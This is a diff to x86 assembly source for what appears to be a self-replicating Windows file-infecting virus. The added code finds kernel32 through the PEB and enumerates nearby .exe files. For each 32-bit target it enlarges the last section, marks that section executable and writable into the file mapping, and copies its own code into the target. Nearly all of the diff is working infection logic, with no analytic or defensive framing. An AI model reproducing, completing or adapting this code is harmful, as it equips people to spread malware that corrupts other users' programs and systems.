@@ -4,7 +4,7 @@
 ;
 ; 	- 0xfee15bad (Alexandre Paillier)
 ;
-	
+
 .386
 .model flat, stdcall
 option casemap:none
@@ -27,6 +27,7 @@ data:
 	FindClose_str           BYTE "FindClose",0
 	GetFullPathName_str     BYTE "GetFullPathNameA",0
 	lstrcmp_str             BYTE "lstrcmp",0
+	lstrlen_str             BYTE "lstrlen",0
 	CreateFile_str          BYTE "CreateFileA",0
 	CreateFileMapping_str   BYTE "CreateFileMappingA",0
 	MapViewOfFile_str       BYTE "MapViewOfFile",0
@@ -47,7 +48,7 @@ get_eip:
 	ASSUME FS:NOTHING
 	mov edx, fs:[030h] ; get the PEB struct
 	ASSUME FS:ERROR
-	
+
 	; ->Ldr / get the PEB_LDR_DATA struct
 	mov edx, (PEB PTR [edx]).Ldr
 	; ->InMemoryOrderModuleList / gets the loaded modules linked list
@@ -104,7 +105,8 @@ loop_find_kernel32_end:
 	add edx, [edx + 03Ch]
 	; get export table
 	mov edx, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).OptionalHeader) \
-	          .DataDirectory[0 * sizeof IMAGE_OPTIONAL_HEADER].VirtualAddress
+	          .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof IMAGE_OPTIONAL_HEADER] \
+			  .VirtualAddress
 	add edx, ebx
 	push edx ; save export table on the stack
 
@@ -163,6 +165,7 @@ loop_find_gpa_end:
 	; store kernel32 base address
 	mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, edi
 
+	push esp
 	lea eax, [ebx + (GetModuleFileName_str - data)]
 	push eax
 	call GetProcAddr
@@ -173,6 +176,7 @@ loop_find_gpa_end:
 	push NULL
 	call eax ; GetModuleFileName() / get current .exe full file path
 
+	push esp
 	lea eax, [ebx + (FindFirstFile_str - data)]
 	push eax
 	call GetProcAddr
@@ -189,6 +193,7 @@ loop_find_gpa_end:
 
 	mov (STACK_STORAGE PTR [esp]).fileQueryHandle, eax
 loop_find_file:
+	push esp
 	lea eax, [ebx + (GetFullPathName_str - data)]
 	push eax
 	call GetProcAddr
@@ -201,13 +206,29 @@ loop_find_file:
 	push MAX_PATH
 	push ecx
 	call eax ; GetFullPathName() / get absolute file path
-	
+
+	; check if it actually ends with .exe
+	push esp
+	lea eax, [ebx + (lstrlen_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	lea edx, (STACK_STORAGE PTR [esp]).targetName
+	push edx
+	call eax
+	; get to the end of the name, expecting ".exe"
+	lea edx, (STACK_STORAGE PTR [esp]).targetName[eax - 4]
+	mov edx, [edx]
+	cmp edx, 'exe.' ; (little endian)
+	jne loop_find_file_continue
+
 	; check if it's a directory
 	mov edx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).dwFileAttributes
 	and edx, FILE_ATTRIBUTE_DIRECTORY
 	cmp edx, FILE_ATTRIBUTE_DIRECTORY
 	je loop_find_file_continue
 
+	push esp
 	lea eax, [ebx + (lstrcmp_str - data)]
 	push eax
 	call GetProcAddr
@@ -227,6 +248,7 @@ loop_find_file:
 	je loop_find_file_continue
 
 	; Target appears good
+	push esp
 	lea eax, [ebx + (CreateFile_str - data)]
 	push eax
 	call GetProcAddr
@@ -243,66 +265,94 @@ loop_find_file:
 	cmp eax, INVALID_HANDLE_VALUE
 	je loop_find_file_continue ; if handle != null
 	mov (STACK_STORAGE PTR [esp]).fileHandle, eax
-	
-	lea eax, [ebx + (CreateFileMapping_str - data)]
-	push eax
-	call GetProcAddr
-	;
-	mov edx, (STACK_STORAGE PTR [esp]).fileHandle
-	push NULL
-	push 0
-	push 0
-	push PAGE_READWRITE
-	push NULL
-	push edx
-	call eax ; CreateFileMapping()
-	mov (STACK_STORAGE PTR [esp]).fileMappingHandle, eax
 
-	lea eax, [ebx + (MapViewOfFile_str - data)]
-	push eax
-	call GetProcAddr
-	;
-	mov edx, (STACK_STORAGE PTR [esp]).fileMappingHandle
+	push esp
 	push 0
-	push 0
-	push 0
-	push (FILE_MAP_WRITE or FILE_MAP_READ)
-	push edx
-	call eax ; MapViewOfFile()
-	mov (STACK_STORAGE PTR [esp]).fileView, eax
+	call MapFileToRAM
+
 
 	; get PE header (base address + offset from the DOS header)
-	mov edx, (STACK_STORAGE PTR [esp]).fileView
-	add edx, [edx + 03Ch]
+	mov edi, (STACK_STORAGE PTR [esp]).fileView
+	add edi, [edi + 03Ch]
 	; check if executable
-	mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).FileHeader).Characteristics
+	mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).Characteristics
 	and ax, IMAGE_FILE_EXECUTABLE_IMAGE
 	cmp ax, IMAGE_FILE_EXECUTABLE_IMAGE
 	jne close_target
 	; check if 32 bit
-	mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edx]).FileHeader).Machine
+	mov ax, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).Machine
 	cmp ax, IMAGE_FILE_MACHINE_I386
 	jne close_target
 
-	
+	; get sections count
+	xor ecx, ecx
+	mov cx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).NumberOfSections
 
+	dec ecx
+	; get last section header
+	mov eax, sizeof IMAGE_SECTION_HEADER
+	mul ecx ; eax = (sizeof IMAGE_SECTION_HEADER * NumberOfSections)
+	lea edx, (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader
+	add dx, (IMAGE_FILE_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).FileHeader).SizeOfOptionalHeader
+	add edx, eax
+	;
+	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Characteristics
+	; set as code
+	or eax, IMAGE_SCN_CNT_CODE
+	; set as executable
+	or eax, IMAGE_SCN_MEM_EXECUTE
+	; set as not discardable
+	mov ecx, IMAGE_SCN_MEM_DISCARDABLE
+	not ecx
+	and eax, ecx
+	; update it
+	mov (IMAGE_SECTION_HEADER PTR [edx]).Characteristics, eax
+
+	; Update VirtualSize using FileAlignment for consistency
+	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Misc
+	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).FileAlignment
+	mov (IMAGE_SECTION_HEADER PTR [edx]).Misc, eax
+
+	; save where to inject in the target
+	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
+	add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
+	mov (STACK_STORAGE PTR [esp]).offsetToDest, eax
+
+	; Update SizeOfRawData
+	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
+	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).FileAlignment
+	mov (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData, eax
+
+	; Update SizeOfImage
+	mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage
+	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
+	mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage, eax
+
+	; re-map the file to memory and change its size
+	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
+	add eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
+	mov (STACK_STORAGE PTR [esp]).fileSize, eax
+	push esp
+	call UnmapFileFromRAM
+	mov eax, (STACK_STORAGE PTR [esp]).fileSize
+	push esp
+	push eax
+	call MapFileToRAM
+
+
+	; inject itself
+	mov esi, ebx                                                    ; src
+	mov edi, (STACK_STORAGE PTR [esp]).fileView
+	add edi, (STACK_STORAGE PTR [esp]).offsetToDest                 ; dst
+	mov ecx, (end_of_code - data)                                   ; length
+	rep movsb
 	;;
 
 close_target:
-	lea eax, [ebx + (UnmapViewOfFile_str - data)]
-	push eax
-	call GetProcAddr
-	;
-	push (STACK_STORAGE PTR [esp]).fileView
-	call eax ; UnmapViewOfFile()
+	push esp
+	call UnmapFileFromRAM
 
-	lea eax, [ebx + (CloseHandle_str - data)]
-	push eax
-	call GetProcAddr
-	;
-	push (STACK_STORAGE PTR [esp]).fileMappingHandle
-	call eax ; CloseHandle()
-
+	push esp
 	lea eax, [ebx + (CloseHandle_str - data)]
 	push eax
 	call GetProcAddr
@@ -312,6 +362,7 @@ close_target:
 
 
 loop_find_file_continue:
+	push esp
 	lea eax, [ebx + (FindNextFile_str - data)]
 	push eax
 	call GetProcAddr
@@ -324,6 +375,7 @@ loop_find_file_continue:
 	cmp eax, TRUE
 	je loop_find_file
 loop_find_file_end:
+	push esp
 	lea eax, [ebx + (FindClose_str - data)]
 	push eax
 	call GetProcAddr
@@ -344,17 +396,88 @@ loop_find_file_end:
 	jmp eax
 
 ; arg1: function name
+; arg2: STACK_STORAGE struct
 ; ret : function address
 GetProcAddr:
-	; switch the two in the stack
-	pop eax
-	pop edx
+	pop eax ; ret
+	pop ecx ; arg1
+	pop edx ; arg2
 	push eax
-	push edx
-	; function name & address already in stack, hence the offsets on esp
-	push (STACK_STORAGE PTR [esp + (sizeof DWORD * 2)]).kernel32BaseAddr
-	call (STACK_STORAGE PTR [esp + (sizeof DWORD * 3)]).GetProcAddress_addr
+
+	push ecx
+	push (STACK_STORAGE PTR [edx]).kernel32BaseAddr
+	call (STACK_STORAGE PTR [edx]).GetProcAddress_addr
 	pop edx
+	jmp edx
+
+; arg1: file size
+; arg2: STACK_STORAGE struct
+; ret : none
+MapFileToRAM:
+	; use of offsets on esp, because the arguments
+	; and return address are on the stack
+	push [esp + (sizeof DWORD * 2)]
+	lea eax, [ebx + (CreateFileMapping_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov edx, (STACK_STORAGE PTR [edx]).fileHandle
+	mov ecx, [esp + (sizeof DWORD * 1)]
+	push NULL
+	push ecx
+	push 0
+	push PAGE_READWRITE
+	push NULL
+	push edx
+	call eax ; CreateFileMapping()
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov (STACK_STORAGE PTR [edx]).fileMappingHandle, eax
+
+	push [esp + (sizeof DWORD * 2)]
+	lea eax, [ebx + (MapViewOfFile_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov edx, (STACK_STORAGE PTR [edx]).fileMappingHandle
+	push 0
+	push 0
+	push 0
+	push (FILE_MAP_WRITE or FILE_MAP_READ)
+	push edx
+	call eax ; MapViewOfFile()
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov (STACK_STORAGE PTR [edx]).fileView, eax
+	;
+	pop edx
+	pop ecx
+	pop ecx
+	jmp edx
+
+; arg1: STACK_STORAGE struct
+; ret : none
+UnmapFileFromRAM:
+	push [esp + (sizeof DWORD * 1)]
+	lea eax, [ebx + (UnmapViewOfFile_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, [esp + (sizeof DWORD * 1)]
+	push (STACK_STORAGE PTR [edx]).fileView
+	call eax ; UnmapViewOfFile()
+
+	push [esp + (sizeof DWORD * 1)]
+	lea eax, [ebx + (CloseHandle_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, [esp + (sizeof DWORD * 1)]
+	push (STACK_STORAGE PTR [edx]).fileMappingHandle
+	call eax ; CloseHandle()
+	;
+	pop edx
+	pop ecx
 	jmp edx
 
 end_of_code:
